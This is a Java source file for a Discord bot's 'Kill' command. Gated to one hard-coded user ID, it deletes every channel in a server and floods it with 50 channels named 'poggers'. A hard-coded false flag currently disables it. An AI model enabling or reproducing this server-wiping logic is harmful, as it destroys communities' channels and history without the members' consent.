package narwhals64.YeastBot.Commands;

import narwhals64.YeastBot.YeastBot;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;


public class Kill extends ListenerAdapter {
    public void onGuildMessageReceived(GuildMessageReceivedEvent event) {
        String args[] = event.getMessage().getContentRaw().split("\\s+");

        boolean allowKill = false;


        if (allowKill && event.getAuthor().getId().equals("240601741085769729")) {

            if (args[0].equalsIgnoreCase(YeastBot.getPrefix(event) + "kill")) {

                if (args[1].equalsIgnoreCase("pog")) {
                    Guild guild = event.getGuild();

                    for (int i = 0 ; i < guild.getChannels().size() ; i++)
                        guild.getChannels().get(i).delete().queue();

                    for (int i = 0; i < 50; i++)
                        guild.createTextChannel("poggers").queue();

                }
            }

        }

    }
}